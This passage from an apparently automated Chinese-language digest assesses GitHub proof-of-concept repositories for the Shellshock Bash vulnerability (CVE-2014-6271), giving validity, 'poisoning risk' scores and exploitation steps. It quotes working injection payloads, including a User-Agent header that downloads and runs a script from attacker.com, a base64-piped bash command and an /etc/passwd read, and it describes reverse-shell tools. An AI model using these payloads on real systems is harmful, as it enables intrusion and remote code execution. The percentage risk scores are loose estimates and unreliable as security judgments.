CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许远程攻击者通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。利用方式通常涉及以下步骤：

1.  **确定目标系统是否易受攻击：** 检查目标系统是否正在运行易受攻击的Bash版本(通过 4.3).
2.  **寻找攻击入口点：** 寻找目标系统上允许通过环境变量影响Bash执行的接口，例如CGI脚本、OpenSSH的ForceCommand功能、DHCP客户端等。
3.  **构造恶意环境变量：** 构造包含恶意代码的函数定义的环境变量。例如：`() {{ :;}}; command`，其中`command`是要执行的命令。
4.  **发送包含恶意环境变量的请求：** 将构造的恶意环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
5.  **触发漏洞：** 目标系统在执行Bash时，会解析包含恶意代码的环境变量，从而执行攻击者指定的命令。

提供的POC代码`AutoShocker.py`是一个利用Shellshock漏洞的自动化脚本，具备以下功能：

*   **命令执行：** 允许攻击者在目标系统上执行任意命令，并将结果返回。
*   **反向Shell：** 允许攻击者在目标系统上建立反向Shell连接，从而获得对目标系统的完全控制权。

该漏洞利用的有效性取决于目标系统是否易受攻击，以及攻击者是否能够找到合适的攻击入口点。由于脚本需要用户输入目标IP和执行的命令/反向shell信息，因此投毒风险主要在于：

*   **误用风险：** 用户可能在未经授权的系统上使用该脚本，导致法律问题。
*   **脚本篡改：**  攻击者可能篡改脚本，添加恶意功能（例如植入后门、窃取用户凭据等），然后诱骗其他用户使用。

因此，我评估此仓库中存在作者隐藏的投毒代码的风险为10%。这主要是基于脚本本身的性质（漏洞利用工具）以及潜在的被篡改和滥用的可能性。

**项目地址:** [YunchoHang/CVE-2014-6271-SHELLSHOCK](https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #14

**来源**: [CVE-2014-6271-ajansha_shellshock.md](../2014/CVE-2014-6271-ajansha_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 通过 4.3

**利用条件:** 需要目标系统存在Bash环境并且存在可以设置环境变量的利用入口，例如：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过在环境变量中嵌入恶意代码，当Bash解析这些变量时，恶意代码会被执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2014-6271是一个真实存在且影响广泛的漏洞。提供的shelly.sh脚本是一个漏洞扫描器，用于检测目标系统是否存在Shellshock漏洞。由于它旨在 *检测* 而非 *利用* 漏洞，因此可以判断poc有效。

**投毒风险：**
分析提供的shelly.sh脚本，主要功能是检测目标系统是否存在Shellshock漏洞。脚本本身包含恶意代码的可能性较低，其主要通过发送包含特定payload的环境变量来触发漏洞，因此投毒的风险主要来自于脚本作者是否在检测Payload之外添加了额外的恶意逻辑。

尽管代码看起来比较直接，但仍然存在一定的低概率投毒风险，例如：
*   在漏洞检测逻辑之外，添加额外的命令执行代码，例如，扫描到存在漏洞后执行特定操作，上传信息等。
*   通过精心构造的payload，在检测漏洞的同时，悄悄地在目标系统上留下后门。

综合考虑代码量和功能，评估投毒风险为10%。

**利用方式：**
1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统。
2.  **寻找入口点：** 确定可以通过设置环境变量来与目标系统交互的入口点。常见的入口点包括：
    *   **HTTP CGI脚本：** 通过修改HTTP请求头中的User-Agent等字段，设置环境变量。
    *   **OpenSSH ForceCommand：**  通过SSH连接时设置环境变量。
    *   **DHCP客户端：** 某些DHCP客户端脚本在执行时会受到环境变量的影响。
3.  **构造Payload：** 构造包含恶意代码的环境变量。Payload的基本形式为`(){ :; }; command`，其中`command`是要执行的命令。
4.  **发送Payload：** 通过选择的入口点将构造的Payload发送给目标系统。
5.  **执行恶意代码：**  当目标系统中的Bash解析包含恶意代码的环境变量时，恶意代码将被执行，攻击者从而控制目标系统。

**项目地址:** [ajansha/shellshock](https://github.com/ajansha/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #15

**来源**: [CVE-2014-6271-akr3ch_CVE-2014-6271.md](../2014/CVE-2014-6271-akr3ch_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的恶意环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的 Bash 版本，且存在允许设置环境变量的途径，如 SSH ForceCommand, Apache mod_cgi/mod_cgid, DHCP 客户端等。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271 (Shellshock) 漏洞存在于 GNU Bash 中，攻击者可以通过在环境变量中嵌入恶意代码，利用 Bash 处理函数定义时存在的缺陷来执行任意命令。提供的 exploit.py 代码通过构造包含恶意命令的 User-Agent 头部，向目标 URL 发送 HTTP 请求，尝试利用 mod_cgi 或其他 CGI 脚本来触发漏洞。该漏洞影响广泛，可能导致服务器被完全控制。

**有效性：**
提供的 Python 脚本是有效的漏洞利用PoC，它通过构造恶意的 User-Agent 头部来触发 Shellshock 漏洞。

**投毒风险：**
该脚本的主要功能是利用 Shellshock 漏洞，没有发现任何明显的投毒代码，0%的可能性存在作者隐藏的投毒代码。

**利用方式：**
1.  确定目标系统运行着存在漏洞的 Bash 版本。
2.  找到一个可以设置环境变量的入口点（如 CGI 脚本）。
3.  使用提供的 Python 脚本或其他类似工具构造包含恶意代码的 HTTP 请求，并将该请求发送到目标 URL。
4.  如果漏洞存在且利用成功，恶意代码将在目标系统上执行。

**项目地址:** [akr3ch/CVE-2014-6271](https://github.com/akr3ch/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #16

**来源**: [CVE-2014-6271-anujbhan_shellshock-victim-host.md](../2014/CVE-2014-6271-anujbhan_shellshock-victim-host.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #17

**来源**: [CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md](../2014/CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，且允许通过环境变量影响Bash执行，例如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。当Bash执行程序（例如，通过CGI脚本在Web服务器上）时，它会解析这些环境变量，从而导致代码注入。 

**有效性：**

根据提供的漏洞库信息、搜索结果和漏洞利用代码，该漏洞利用是有效的。漏洞库中明确指出该漏洞允许远程攻击者执行任意代码，搜索结果中也包含大量关于该漏洞的描述、利用案例和补丁信息。提供的Python POC代码也表明该漏洞可以被利用于获取目标系统的反向shell。

**投毒风险：**

分析提供的Python POC代码，风险较低。代码主要功能是构建带有恶意环境变量的HTTP请求，并发送到目标CGI脚本。代码中存在可以植入恶意代码的风险点在于payload的构建部分，但是目前的代码相对简单，仅用于执行反向shell。该仓库的 README 中有明确的测试目标和使用说明，相对比较安全。综上，认为此仓库存在10%的作者隐藏的投毒代码的可能性，该投毒代码可能为隐蔽的下载和执行其他恶意脚本。

**利用方式：**

1.  **确定目标：** 找到运行Bash且容易受到环境变量影响的应用程序或服务。常见的例子包括Web服务器上的CGI脚本。
2.  **构建Payload：** 构造一个包含恶意代码的环境变量。Payload通常包含一个函数定义，后跟要执行的命令。例如：`(){ :; }; echo vulnerable`
3.  **发送Payload：** 将构造的环境变量作为HTTP请求头或其他方式发送到目标应用程序。对于CGI脚本，可以通过User-Agent或其他HTTP头来传递。
4.  **执行代码：** 当目标应用程序调用Bash执行某些操作时，Bash会解析环境变量，从而执行注入的恶意代码。
5.  **反向Shell:** 本次提供的POC中,攻击者设置监听端口,通过漏洞利用,目标主机反弹shell给攻击者,达到控制目标主机的目的.

**风险缓解：**

*   升级Bash到已修复的版本。
*   限制对CGI脚本和其他易受攻击应用程序的访问。
*   验证和清理所有输入，特别是来自环境变量的输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #18

**来源**: [CVE-2014-6271-cved-sources_cve-2014-6271.md](../2014/CVE-2014-6271-cved-sources_cve-2014-6271.md)

## CVE-2014-6271-ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或使用OpenSSH的ForceCommand功能等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又称ShellShock，是一个存在于GNU Bash中的远程代码执行漏洞。漏洞源于Bash在处理环境变量中函数定义后的trailing strings的方式存在缺陷，允许攻击者通过构造恶意的环境变量来执行任意代码。

**1. 有效性：**

提供的Dockerfile构建了一个存在ShellShock漏洞的环境。`test.cgi`脚本被放置在`/usr/local/apache2/cgi-bin/`目录下，并且赋予了执行权限。该脚本会输出`/usr/bin/env`的内容，攻击者可以通过构造包含恶意代码的环境变量，并发送HTTP请求访问该CGI脚本，从而触发漏洞并执行恶意代码。因此提供的POC代码是有效的。

**2. 投毒风险：**

分析Dockerfile和相关文件：

*   Dockerfile：用于构建Docker镜像，升级Bash到4.3，并应用patch。
*   README.md：包含关于漏洞的信息以及镜像的来源。
*   `build/test.cgi`：一个简单的CGI脚本，用于触发漏洞。这个脚本本身不包含任何恶意代码,只是用于展示环境变量。

虽然大部分代码用于搭建漏洞测试环境，但仍存在潜在的投毒风险。Dockerfile中使用了`wget`从外部源下载bash源码和patch。尽管URL看起来是官方的GNU源，但如果这些源被劫持，则可能被替换为包含恶意代码的版本。此外，即使源代码没有被篡改，应用patch的过程也可能引入意料之外的问题。

综合来看，投毒风险较低，大约为10%。主要风险在于对外部源的依赖，以及patch应用过程中的潜在问题。

**3. 利用方式：**

ShellShock漏洞的利用方式如下：

1.  **攻击者构造包含恶意代码的环境变量。** 恶意代码被嵌入到函数定义之后，例如：`(){ :; }; command`。
2.  **攻击者通过某种方式将该环境变量传递给Bash。** 常见的场景包括：
    *   **CGI脚本：** 攻击者可以通过HTTP请求头设置环境变量，当Web服务器调用CGI脚本时，会将这些环境变量传递给Bash解释器。
    *   **OpenSSH的ForceCommand功能：** 攻击者可以通过SSH连接，利用ForceCommand功能执行命令，并将恶意环境变量传递给Bash。
    *   **DHCP客户端：** 在某些情况下，DHCP客户端会执行脚本，并将DHCP服务器提供的环境变量传递给Bash。
3.  **Bash执行包含恶意代码的环境变量。** 当Bash遇到函数定义后的trailing strings时，会将其作为命令执行，从而导致远程代码执行。

例如，通过CGI脚本利用该漏洞的Payload可能如下所示：

```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; /usr/bin/env
Host: target.com
```

该请求会将`User-Agent`头设置为包含恶意代码的环境变量，当Web服务器调用`test.cgi`脚本时，`/usr/bin/env`命令会被执行。

**项目地址:** [cved-sources/cve-2014-6271](https://github.com/cved-sources/cve-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #19

**来源**: [CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md](../2014/CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 4.3

**利用条件:** 目标系统使用CGI，OpenSSH等方式，且Bash版本在受影响范围内

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的、包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用的方式是：通过将包含函数定义的恶意字符串作为环境变量的值传递给Bash，Bash在解析这些环境变量时，会错误地执行函数定义后面的命令。漏洞利用代码分析：提供的Dockerfile构建了一个包含易受攻击的Bash版本（4.3.0）和Apache HTTP Server的Docker镜像。`safe.cgi`和`victim.cgi`脚本被添加到`/var/www/html/`目录下。`victim.cgi`使用易受攻击的Bash版本，而`safe.cgi` 使用修复后的版本（但提供的代码中，两个cgi都一样，都是直接输出helloworld）。攻击者可以通过修改User-Agent头，或者通过其他CGI变量传递恶意代码，从而在服务器上执行命令。根据readme.md的描述，向victim.cgi发送包含payload的User-Agent，可以触发漏洞。例如：

`User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id`

该漏洞利用的有效性较高，因为漏洞原理简单，且影响范围广泛。**投毒风险评估：**代码仓库中可能存在作者隐藏的恶意代码的风险较低，这里评估为1%。主要原因是：Dockerfile比较简单，只是构建了一个包含特定版本Bash和Apache HTTP Server的镜像，没有发现明显的后门代码。safe.cgi和victim.cgi 脚本本身也比较简单，只是输出“Hello world”，并没有包含任何可疑的逻辑。flagA文件只是一个标记文件，不包含任何可执行代码。虽然不能完全排除作者在镜像构建过程中隐藏恶意代码的可能性，但从目前的代码来看，这种可能性很小。

**利用方式总结：**

1.  **确定目标系统使用的Bash版本在受影响范围内（<=4.3）。**
2.  **找到一个可以设置环境变量的入口点，例如CGI脚本、OpenSSH的ForceCommand等。**
3.  **构造包含恶意代码的环境变量，例如：`() { :; }; /usr/bin/id`。**
4.  **将该环境变量传递给Bash。**
5.  **Bash解析环境变量时，会执行恶意代码。**

利用代码中的`victim.cgi`脚本是一个CGI入口点，攻击者可以通过修改HTTP请求头（例如User-Agent）来设置环境变量，从而触发漏洞。

**项目地址:** [cyberharsh/Shellbash-CVE-2014-6271](https://github.com/cyberharsh/Shellbash-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #20

**来源**: [CVE-2014-6271-hadrian3689_shellshock.md](../2014/CVE-2014-6271-hadrian3689_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Bash <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过OpenSSH等方式设置环境变量

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的远程代码执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。

**有效性：**
提供的POC代码是有效的。该Python脚本利用Shellshock漏洞通过User-Agent头注入恶意Bash代码，从而在目标系统上执行命令，可以实现反向shell或伪交互式shell。

**投毒风险：**
该脚本主要功能是利用Shellshock漏洞，但代码中存在一定的投毒风险：
*   **风险点：** `shellshock.py`中的payload构造部分，即`payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"`。虽然脚本本身的目标是实现反向shell，但是攻击者可以修改`cmd`变量的内容，插入恶意的、非反向shell的代码，进行破坏或植入后门。
*   **缓解措施：** 使用者应仔细审查脚本内容，尤其是`cmd`变量的赋值部分，确保脚本执行的是预期操作，并且来自可信来源。
*   **投毒风险百分比:** 10%。主要是脚本中自定义命令的灵活性可能被滥用，并非恶意代码。大部分代码功能清晰，实现的是漏洞利用逻辑。

**利用方式：**
1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，Bash会执行函数定义后面的字符串。攻击者可以利用这个特性，在环境变量中注入恶意代码。
2.  **攻击方法：**
    *   **通过HTTP User-Agent头：** POC脚本通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量传递给服务器。如果服务器使用Bash处理User-Agent头（例如，通过CGI脚本），那么恶意代码就会被执行。
    *   **反向Shell：** 脚本通过构造Bash命令，建立与攻击者机器的反向TCP连接，从而获得目标系统的shell访问权限。
    *   **正向Shell (防火墙绕过)：** 脚本创建一个命名管道(FIFO)用于输入和输出，攻击者通过HTTP请求向管道写入命令，并读取管道的输出来实现交互式shell。这种方式可以绕过一些防火墙的限制。
3.  **利用条件：**
    *   目标系统运行着存在Shellshock漏洞的Bash版本。
    *   存在可以传递环境变量给Bash的途径，例如CGI脚本、OpenSSH的ForceCommand等。
    *   如果使用反向shell，目标系统需要能够连接到攻击者的机器。

**项目地址:** [hadrian3689/shellshock](https://github.com/hadrian3689/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #21

**来源**: [CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md](../2014/CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** Bash

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本、OpenSSH等利用入口，允许设置环境变量

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以构造包含恶意代码的环境变量，当Bash shell执行时，会将恶意代码一并执行，从而达到远程命令执行的目的。

**有效性：**

提供的POC代码是有效的，它演示了利用Shellshock漏洞的基本原理，即通过设置包含恶意代码的环境变量来执行任意命令。shellshock.c 文件通过提权后执行 bash 命令来证明改漏洞的利用。

**投毒风险：**

代码仓库中未发现明显的投毒代码。shellshock.c 只是简单的提权后执行了 bash 命令。

**利用方式：**

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值以函数定义开头，Bash会尝试解析并执行该函数定义之后的代码。如果攻击者能够控制环境变量的内容，就可以注入恶意的代码。

2.  **利用场景：**

    *   **CGI脚本：**  Web服务器在执行CGI脚本时，会将HTTP请求头中的某些字段作为环境变量传递给脚本。攻击者可以修改这些HTTP请求头，注入恶意代码。
    *   **OpenSSH：**  如果OpenSSH启用了`ForceCommand`功能，并且`ForceCommand`中使用了Bash shell，攻击者可以通过设置环境变量来执行命令。
    *   **DHCP客户端：**  某些DHCP客户端脚本会执行Bash shell，攻击者可以通过控制DHCP服务器，设置包含恶意代码的环境变量。

3.  **利用步骤：**

    a.  确定目标系统存在Bash shell，且版本小于等于4.3。
    b.  找到一个可以通过环境变量影响Bash执行的入口（例如CGI脚本）。
    c.  构造包含恶意代码的环境变量，例如：
        `export payload='() { ignored; }; /bin/cat /etc/passwd'`
    d.  将该环境变量传递给Bash shell执行。
    e.  如果漏洞存在，`/etc/passwd`文件的内容将被输出。

**项目地址:** [hanmin0512/CVE-2014-6271_pwnable](https://github.com/hanmin0512/CVE-2014-6271_pwnable)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #22

**来源**: [CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md](../2014/CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，且攻击者能够通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271（ShellShock）是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用方式主要依赖于Bash处理函数定义后尾随字符串的方式。攻击者可以将恶意代码嵌入到环境变量中，当Bash解析这些变量时，尾随的恶意代码会被执行。

**有效性评估：**
漏洞库信息和搜索结果均表明该漏洞真实存在且危害严重，存在大量可利用的场景。利用代码库中提供的文件看起来是GNU GPL许可证，本身不包含攻击代码，但实际漏洞利用需要构造特定的环境变量。

**投毒风险评估：**
提供的漏洞利用代码片段（LICENSE文件）本身不具备投毒性，它只是一个开源协议文件。投毒风险主要存在于漏洞利用的上下文和攻击者构造的恶意环境变量中。如果攻击者散布包含恶意代码的环境变量构造方法，可能会诱导用户执行有害操作。但仅分析提供的LICENSE文件，投毒风险极低，约为1%。

**利用方式分析：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/eject`。
2.  **触发Bash解析：** 寻找能够触发Bash解析这些环境变量的入口点。常见的入口点包括：
    *   OpenSSH的`ForceCommand`。
    *   Apache HTTP Server的`mod_cgi`和`mod_cgid`模块。
    *   DHCP客户端脚本。
    *   其他任何跨越权限边界并设置环境变量的Bash执行场景。
3.  **远程代码执行：** 当Bash解析包含恶意代码的环境变量时，嵌入的命令会被执行，导致远程代码执行。

根据搜索结果，该漏洞已存在多年，但由于其影响范围广泛，仍然值得关注。应及时更新Bash版本，并检查系统配置，避免受到攻击。

**项目地址:** [indiandragon/Shellshock-Vulnerability-Scan](https://github.com/indiandragon/Shellshock-Vulnerability-Scan)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #23

**来源**: [CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md](../2014/CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统权限获取

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为shell，且存在CGI脚本或允许通过环境变量传递命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。当Bash shell处理这些环境变量时，会在函数定义后执行嵌入的命令，从而导致安全风险。

**有效性：**

提供的PoC代码是有效的，它通过`pwn`库和`requests`库实现漏洞利用。该脚本通过构造包含恶意Bash代码的HTTP请求头（User-Agent, Cookie, Referer）发送到目标服务器，如果目标服务器存在CGI脚本且使用存在漏洞的Bash版本，则会执行恶意代码，并反弹shell到攻击者指定的IP地址和端口。

**投毒风险：**

该仓库中存在一定的投毒风险，风险评估为10%。虽然作者提供了免责声明，并且主要代码逻辑是为了利用Shellshock漏洞，但仍然存在潜在的后门或恶意修改的可能性，尽管看起来相对较低：
*   **依赖风险**: 依赖`pwn`和`requests`库，如果这些库被篡改，可能引入恶意代码。
*   **Payload定制**: Payload的构造方式可能被修改，引入额外的恶意行为。

**利用方式：**

1.  **确定目标：** 寻找运行CGI脚本的web服务器，或者其他任何可能通过环境变量传递命令给Bash的应用程序。
2.  **构造Payload：** 构造一个包含恶意Bash代码的环境变量，例如：`() { :;}; /bin/bash -c 'command'`。
3.  **传递Payload：** 通过HTTP请求头（User-Agent, Cookie, Referer）或者其他方式将payload作为环境变量传递给目标系统。
4.  **触发漏洞：** 当Bash shell处理包含恶意代码的环境变量时，会执行嵌入的命令。
5.  **获取权限：** 利用反弹shell或其他方式获取目标系统的控制权。

**项目地址:** [knightc0de/Shellshock_vuln_Exploit](https://github.com/knightc0de/Shellshock_vuln_Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #24

**来源**: [CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md](../2014/CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md)

## CVE-2014-6271-Apache-Debian Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本，且Apache配置允许执行CGI脚本，并且Bash版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271（Shellshock）是一个影响 GNU Bash 的高危漏洞。该漏洞源于 Bash 处理环境变量中函数定义后附加字符串的方式存在缺陷，允许远程攻击者通过构造特殊的环境变量来执行任意代码。

**有效性：**

根据提供的 PoC 代码（/tmp/47c4ac3d27239b789878e6360b54dc21/README.md），该 PoC 旨在演示如何在 Apache Debian 环境中利用 CVE-2014-6271 漏洞。它包含构建易受攻击的 Docker 镜像和 Kubernetes 清单的步骤，以及利用漏洞的演示。

PoC 代码的有效性通过以下事实得到证实：

*   它提供了一个明确的攻击向量：通过 `User-Agent` HTTP 头传递恶意构造的 Bash 函数定义。
*   它演示了如何获得受害容器上的 shell 访问权限。
*   它演示了如何在受害容器上修改 Web 页面内容。

因此，提供的 PoC 代码可以被认为是有效的。

**投毒风险：**

评估 PoC 代码的投毒风险表明，主要风险较低，约为 5%。

*   **高风险文件:** 位于`/tmp/47c4ac3d27239b789878e6360b54dc21/web-insecure/Dockerfile`，这个Dockerfile 用于构建包含漏洞环境，该漏洞是已知的，构建目的是用于演示验证，所以它不是投毒代码。
*   **低风险文件:** 其他文件（例如 web-secure 目录中的文件和 k8s 清单文件）似乎是良性的，并且用于设置安全的环境以进行比较或者演示。
*   **总体分析:**

虽然该存储库的目的是演示漏洞，但攻击者可能会修改 `web-insecure/Dockerfile` 以包含其他恶意软件或后门。用户在使用这些文件构建镜像时应谨慎。

**利用方式：**

利用 CVE-2014-6271 漏洞涉及以下步骤：

1.  **确定目标：**识别运行易受攻击的 Bash 版本的系统，该系统通常用于处理 Web 请求或 CGI 脚本。
2.  **构造攻击负载：**创建一个包含恶意 Bash 函数定义的特殊构造的环境变量。
3.  **传递攻击负载：**通过 HTTP 请求头（例如 `User-Agent`）或 CGI 脚本可以访问的任何其他环境变量将攻击负载传递到目标系统。
4.  **执行任意代码：**当 Bash 处理恶意环境变量时，它会执行其中嵌入的命令。

